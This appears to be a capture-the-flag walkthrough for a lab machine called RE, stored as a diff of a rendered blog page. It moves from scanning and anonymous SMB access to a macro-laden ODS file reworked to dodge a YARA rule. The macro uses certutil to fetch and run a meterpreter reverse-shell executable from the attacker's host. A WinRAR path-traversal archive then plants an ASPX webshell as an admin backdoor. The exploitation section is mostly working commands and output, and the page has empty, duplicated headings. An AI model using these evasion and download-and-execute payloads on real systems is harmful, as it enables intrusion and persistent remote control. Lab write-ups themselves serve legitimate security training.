@@ -1,0 +1,395 @@
+I"�]<p>Walkthrough for RE - 10.10.10.144</p>
+
+<h2 id="overview">Overview</h2>
+
+<h2 id="setup">Setup</h2>
+
+<p>Running Kali I make a temporary working directory, set some variables and update all the things.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>tmp <span class="o">&amp;&amp;</span> <span class="nb">cd </span>tmp
+<span class="nv">TARGET</span><span class="o">=</span>10.10.10.144
+<span class="nb">sudo </span>apt update <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt upgrade
+</code></pre></div></div>
+
+<h2 id="scanning">Scanning</h2>
+
+<script src="https://gist.github.com/bovinehero/27082b91d142f1506c6ea5a263ecbccd.js"> </script>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h2 id="rce">RCE</h2>
+
+<h2 id="getting-user">Getting User</h2>
+
+<h2 id="getting-root">Getting Root</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-Pn</span> <span class="nv">$TARGET</span>
+</code></pre></div></div>
+
+<p>I get</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 15:39 GMT
+Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+Nmap scan report for 10.10.10.144
+Host is up (0.021s latency).
+Not shown: 998 filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 6.48 seconds
+</code></pre></div></div>
+
+<h2 id="web">Web</h2>
+
+<p>When I visit the website</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 10.10.10.144
+</code></pre></div></div>
+
+<p>it suggests the site is at reblog.htb</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Visit reblog.htb<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">http-equiv = </span><span class="s">"refresh"</span> <span class="na">content = </span><span class="s">"2; url = http://reblog.htb"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/head&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;p&gt;</span>More sites coming soon.<span class="nt">&lt;/p&gt;</span>
+    <span class="nt">&lt;p&gt;</span>Current site located at <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://reblog.htb"</span><span class="nt">&gt;</span>http://reblog.htb<span class="nt">&lt;/a&gt;</span>.<span class="nt">&lt;/p&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+ <span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Ok, with that info I need to add network data to my hosts file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">--</span> sh <span class="nt">-c</span>  <span class="s2">"echo </span><span class="se">\"</span><span class="s2">10.10.10.144</span><span class="se">\t</span><span class="s2">reblog.htb</span><span class="se">\"</span><span class="s2"> &gt;&gt; /etc/hosts"</span>
+</code></pre></div></div>
+
+<p>http://reblog.htb/2019/03/20/ghidra-rce.html</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.144 <span class="nt">-u</span> <span class="s1">'anonymous'</span> <span class="nt">-p</span> <span class="s1">''</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.144...
+[+] IP: 10.10.10.144:445        Name: 10.10.10.144                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        .                                                  
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    InitShutdown
+        fr--r--r--                4 Sun Dec 31 23:58:45 1600    lsass
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    ntsvcs
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    scerpc
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-338-0
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    epmapper
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-1c0-0
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    LSM_API_service
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    eventlog
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-3d0-0
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    atsvc
+        fr--r--r--                4 Sun Dec 31 23:58:45 1600    wkssvc
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-3bc-0
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    spoolss
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-694-0
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    trkwks
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    W32TIME_ALT
+        fr--r--r--                4 Sun Dec 31 23:58:45 1600    srvsvc
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-250-0
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    vgauth-service
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-260-0
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    ROUTER
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    PSHost.132235728052991248.1728.DefaultAppDomain.powershell
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    PSHost.132235728052982073.1712.DefaultAppDomain.powershell
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    PSHost.132235728052984820.1720.DefaultAppDomain.powershell
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    efsrpc
+        IPC$                                                    READ ONLY       Remote IPC
+        .                                                  
+        dr--r--r--                0 Wed Jan 15 15:26:32 2020    .
+        dr--r--r--                0 Wed Jan 15 15:26:32 2020    ..
+        malware_dropbox                                         READ ONLY
+</code></pre></div></div>
+
+<p>By using an anonymous user, I was able to see the malware_dropbox share/folder with read-only permissions.  I am going to see whats in that share/folder by using smbclient.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="se">\\\\</span>10.10.10.144<span class="se">\\</span>malware_dropbox
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Tue Jun 18 17:08:36 2019
+  ..                                  D        0  Tue Jun 18 17:08:36 2019
+
+        8247551 blocks of size 4096. 4295285 blocks available
+smb: \&gt; 
+</code></pre></div></div>
+
+<p>I was able to access the directory, but it seems to be empty.  To see if I can upload anything, I am going to upload a temporary file.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: \&gt; put blank.file
+putting file blank.file as \blank.file (0.0 kb/s) (average 0.0 kb/s)
+smb: \&gt; ls
+  .                                   D        0  Tue Jan  7 16:32:35 2020
+  ..                                  D        0  Tue Jan  7 16:32:35 2020
+  blank.file                          A        0  Tue Jan  7 16:32:35 2020
+
+        8247551 blocks of size 4096. 4295209 blocks available
+</code></pre></div></div>
+
+<p>However, about 10 seconds later…</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: \&gt; ls
+  .                                   D        0  Tue Jan  7 16:32:38 2020
+  ..                                  D        0  Tue Jan  7 16:32:38 2020
+       8247551 blocks of size 4096. 4295209 blocks available
+</code></pre></div></div>
+
+<p>The file that I uploaded is now gone.  I am guessing the file is being parsed and then removed. If you remember back to one of the reblog.htb posts about ODS files…</p>
+
+<blockquote>
+  <p>If you see any interesting documents that might get past our yara rules, please drop them in the malware dropbox. I’ve got some automated processing that will see if our rules already identify it, and if not, run it to collect some log data and queue it for further analysis.</p>
+</blockquote>
+
+<p>Could they be talking about the same malware_dropbox folder that I already have access to via smbclient?  If thats the case, I am going to generate a malicious ODS file by following this <a href="https://0xdf.gitlab.io/2019/03/27/analyzing-document-macros-with-yara.html">link</a>. (wink, nod, to machine author. DED!)  However, the post at reblog.htb also said…</p>
+
+<blockquote>
+  <p>The SOC has been seeing lots of phishing attempts with ods attachements lately. It seems that we’ve got rules in place to detect any run of the mill stuff, including documents that are generated by Metasploit, documents with powershell or cmd invocations.</p>
+</blockquote>
+
+<p>So, I may not be able to use the metasploit module for generating a malicious ODS file, unless I modify it to avoid detection.  Also, the file will probably need some obfusication to get past the Yara rules mentioned in the post as well.</p>
+
+<blockquote>
+  <p>We have basic rules to look for PowerShell and cmd in macros, but I’m not sure that protects us against everything in here. Can someone take a look?</p>
+</blockquote>
+
+<p>At this point. I think the foodhold portion of this post is complete, and now time to push for a user account.</p>
+
+<h2 id="getting-user-1">Getting User</h2>
+
+<p>To see if I can bypass their malware detection, I am going to generate a malicious ODS file from metasploit, then modify it to possibly bypass the yara rules.  Again, I keep the same link as above as a reference while modifying files.</p>
+
+<p>Lets make an obfuscated backdoor</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>msfconsole
+</code></pre></div></div>
+
+<p>I need to work out how to bypass the yara (from previous link).  Referring back, I was able to find a demo Yara rule written to block the metasploit ODT/ODS file attack, seen below.:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule metasploit 
+{
+    strings:
+        $getos = "select case getGUIType" nocase
+        $getext = "select case GetOS" nocase
+        $func1 = "Sub OnLoad" nocase
+        $func2 = "Sub Exploit" nocase
+        $func3 = "Function GetOS() as string" nocase
+        $func4 = "Function GetExtName() as string" nocase
+
+    condition:
+        (all of ($get*) or 3 of ($func*))
+}
+</code></pre></div></div>
+
+<p>This rule matches the ODS file structure, making the standard malicious ODS file useless.  However, now that I know what the Yara rule may be looking for, I can modify a new ODS file accordingly.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span> <span class="n">multi</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">openoffice_document_macro</span>
+<span class="n">set</span> <span class="no">LHOST</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.29</span>
+<span class="n">set</span> <span class="no">RHOST</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.144</span>
+<span class="n">run</span>
+</code></pre></div></div>
+
+<p>I <em>could</em> try with these set payloads but I’m going to strip them out and replace with mine</p>
+
+<p>First I get my exploit:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span> <span class="n">payload</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</code></pre></div></div>
+
+<p>make the payload:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">set</span> <span class="no">LHOST</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.29</span>
+<span class="n">set</span> <span class="no">LPORT</span> <span class="mi">4444</span>
+<span class="n">generate</span> <span class="o">-</span><span class="n">f</span> <span class="n">exe</span> <span class="o">-</span><span class="n">i</span> <span class="mi">3</span> <span class="o">-</span><span class="n">o</span> <span class="n">virus</span><span class="p">.</span><span class="nf">exe</span> <span class="o">-</span><span class="nb">p</span> <span class="n">windows</span> <span class="o">-</span><span class="n">b</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span>
+</code></pre></div></div>
+
+<p>With the payload preped I can configure the file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip msf.odt
+</code></pre></div></div>
+
+<p>First things first, I already know the OS I am attacking, so I can strip that logic from the <code class="highlighter-rouge">files/Basic/Standard/Module1.xml</code> file listed above.  This would include removing both the <code class="highlighter-rouge">GetOS()</code> and <code class="highlighter-rouge">GetExtName()</code> functions.  Since I removed those 2 function, there is really no need for an Exploit function, when I can run everything from within OnLoad instead.  Next, the function name OnLoad is also listed in the Yara rules, so I am going to rename this function to something like  OnStart.
+unzip msf.zip
+After the modifications above, the files/Basic/Standard/Module1.xml file should look like the following:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd"&gt;</span>
+<span class="nt">&lt;script:module</span> <span class="na">xmlns:script=</span><span class="s">"http://openoffice.org/2000/script"</span> <span class="na">script:name=</span><span class="s">"Module1"</span> <span class="na">script:language=</span><span class="s">"StarBasic"</span><span class="nt">&gt;</span>REM  *****  BASIC  *****
+
+
+    Sub OnStart
+    <span class="c">&lt;!-- add commands here --&gt;</span>
+    End Sub
+    
+<span class="nt">&lt;/script:module&gt;</span>
+</code></pre></div></div>
+
+<p>Now time to add the payload commands within the OnStart function.   If you remember, the SOC admin on the reblog.htb post, said they had written Yara rules for both CMD and PowerShell commands, so I am going to try and use another command to download the malicious file <code class="highlighter-rouge">virus.exe</code> that I created within Metasploit. As mentioned in <a href="https://lolbas-project.github.io/">lolbas</a> the <code class="highlighter-rouge">certutil.exe</code> looks like it has potential.</p>
+
+<p>After adding the payload commands, the <code class="highlighter-rouge">files/Basic/Standard/Module1.xml</code> now looks like the one below:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd"&gt;</span>
+<span class="nt">&lt;script:module</span> <span class="na">xmlns:script=</span><span class="s">"http://openoffice.org/2000/script"</span> <span class="na">script:name=</span><span class="s">"Module1"</span> <span class="na">script:language=</span><span class="s">"StarBasic"</span><span class="nt">&gt;</span>REM  *****  BASIC  *****
+
+
+    Sub OnStart
+
+        Shell(<span class="ni">&amp;quot;</span>certutil -urlcache -split -f 'http://10.10.14.29/virus.exe' C:\Windows\System32\spool\drivers\color\virus.exe<span class="ni">&amp;quot;</span>)
+        Shell(<span class="ni">&amp;quot;</span>C:\Windows\System32\spool\drivers\color\virus.exe<span class="ni">&amp;quot;</span>)
+    
+    End Sub
+    
+<span class="nt">&lt;/script:module&gt;</span>
+</code></pre></div></div>
+
+<p>Finally I need to replace the OnLoad function with OnStart in content.xml to trigger when opened.
+I re-package the ods file with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip <span class="nt">-r</span> evil.ods.zip ./<span class="k">*</span> <span class="o">&amp;&amp;</span> <span class="nb">mv </span>evil.ods.zip evil.ods 
+</code></pre></div></div>
+
+<p>OK, so Ive created an ods file that when opened will trigger a macro that will reach out to my server and download my virus.exe to the hopefully unprotected C:\Windows\System32\spool\drivers\color\ drive.</p>
+
+<p>Finally the macro will execute C:\Windows\System32\spool\drivers\color\virus.exe requesting a reverse shell from me.</p>
+
+<p>in a new terminal I start a python web server to listen for incoming requests.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server <span class="nt">-b</span> 10.10.14.29 80
+</code></pre></div></div>
+
+<p>Back to msf and I need to start the Metasploit multi-handler to wait for a possible meterpreter reverse_tcp shell from the target machine after running a malicious ODS file.</p>
+
+<pre><code class="language-RUBY">use exploit/multi/handler
+set LHOST 10.10.14.29
+run
+</code></pre>
+
+<p>I then go back to my original terminal and connect to the malware_dropbox share and upload the file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="se">\\\\</span>10.10.10.144<span class="se">\\</span>malware_dropbox
+put evil.ods
+</code></pre></div></div>
+
+<p>from the webserver terminal I see it getting picked up:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Serving HTTP on 10.10.14.29 port 80 (http://10.10.14.29:80/) ...
+10.10.10.144 - - [15/Jan/2020 19:56:30] "GET /virus.exe HTTP/1.1" 200 -
+10.10.10.144 - - [15/Jan/2020 19:56:30] "GET /virus.exe HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<p>and from msfconsole I have a shell!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Started reverse TCP handler on 10.10.14.29:4444 
+[*] Sending stage (206403 bytes) to 10.10.10.144
+[*] Meterpreter session 1 opened (10.10.14.29:4444 -&gt; 10.10.10.144:49676) at 2020-01-15 21:54:39 +0000
+
+meterpreter &gt; getuid
+Server username: RE\luke
+meterpreter &gt; 
+</code></pre></div></div>
+
+<pre><code class="language-cmd">cat c:/Users/luke/Desktop/user.txt
+FE41736F5B9311E48E48B520D9F384D3
+</code></pre>
+
+<h2 id="get-root">Get Root</h2>
+
+<p>I go to Luke’s Docs and do a dir listing:</p>
+
+<pre><code class="language-cmd">cd C:/Users/Luke/Documents
+dir
+</code></pre>
+
+<p>to get</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Listing: C:\Users\Luke\Documents
+================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+40777/rwxrwxrwx   0        dir   2019-03-14 01:45:01 +0000  My Music
+40777/rwxrwxrwx   0        dir   2019-03-14 01:45:01 +0000  My Pictures
+40777/rwxrwxrwx   0        dir   2019-03-14 01:45:01 +0000  My Videos
+100666/rw-rw-rw-  402      fil   2019-03-14 01:45:04 +0000  desktop.ini
+40777/rwxrwxrwx   0        dir   2019-03-14 01:47:55 +0000  malware_dropbox
+40777/rwxrwxrwx   4096     dir   2019-03-14 01:48:03 +0000  malware_process
+40777/rwxrwxrwx   0        dir   2019-03-14 16:02:21 +0000  ods
+100666/rw-rw-rw-  1096     fil   2019-03-20 20:27:16 +0000  ods.yara
+100666/rw-rw-rw-  1783     fil   2019-03-14 12:18:59 +0000  process_samples.ps1
+100777/rwxrwxrwx  1485312  fil   2019-02-23 01:04:22 +0000  yara64.exe
+</code></pre></div></div>
+
+<p>I take process_samples.ps1</p>
+
+<pre><code class="language-cmd">download process_samples.ps1
+</code></pre>
+
+<p>and see that it uses WinRAR</p>
+
+<pre><code class="language-ps">#&amp; 'C:\Program Files (x86)\WinRAR\Rar.exe' a -ep $process_dir\temp.rar $process_dir\*.ods 2&gt;&amp;1 | Out-Null
+</code></pre>
+
+<p>And that it renames the files</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Upstream processing may expect rars. Rename to .rar
+
+</code></pre></div></div>
+
+<p>As it turns out WinRAR is pretty broken and allows RCE by adding or over-writing an existing file. (google it)</p>
+
+<p>I need a place to run the code that is not running as luke</p>
+
+<p>Some aspx <a href="https://github.com/xl7dev/WebShell">webshells</a></p>
+
+<p>This <a href="https://raw.githubusercontent.com/xl7dev/WebShell/master/Aspx/ASPX%20Shell.aspx">one</a> looks pretty good, so I take it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">-O</span> backdoor.aspx https://raw.githubusercontent.com/xl7dev/WebShell/master/Aspx/ASPX%20Shell.aspx
+</code></pre></div></div>
+
+<p>next I need to make a windows file path on the attack machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo mkdir</span> <span class="nt">-p</span> /inetpub/wwwroot/blog
+<span class="nb">cd</span> /inetpub/wwwroot/blog
+<span class="nb">sudo cp</span> ~/OffSec/tmp/backdoor.aspx <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>I zip it like this to mess with the unzip victim side and copy it back to my working directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip pwnd.zip ../../../../../../../../../../../../../inetpub/wwwroot/blog/backdoor.aspx
+<span class="nb">sudo cp </span>pwnd.zip ~/OffSec/tmp/
+</code></pre></div></div>
+
+<p>back to the meterpreter terminal I drop to a shell</p>
+
+<pre><code class="language-cmd">shell
+</code></pre>
+
+<p>and use the same ‘safe’ command to upload pwnd.zip from my simple http server and save it as a rar.</p>
+
+<pre><code class="language-cmd">certutil.exe -urlcache -split -f "http://10.10.14.29/pwnd.zip" c:\Users\luke\Documents\ods\pwnd.rar
+</code></pre>
+
+<p>I wait a few moments to ensure the code executes and then visit http://reblog.htb/backdoor.aspx.
+I have a persistent backdoor running as admin</p>
+
+<p>http://reblog.htb/backdoor.aspx?fdir=C%3a%2fUsers%2f
+http://reblog.htb/backdoor.aspx?get=C%3a%2fUsers%2f%2f</p>
+
+<p>http://reblog.htb/backdoor.aspx?get=C%3a%2fUsers%2f%2fluke%2f%2fDesktop%2f%2fuser.txt</p>
+:ET
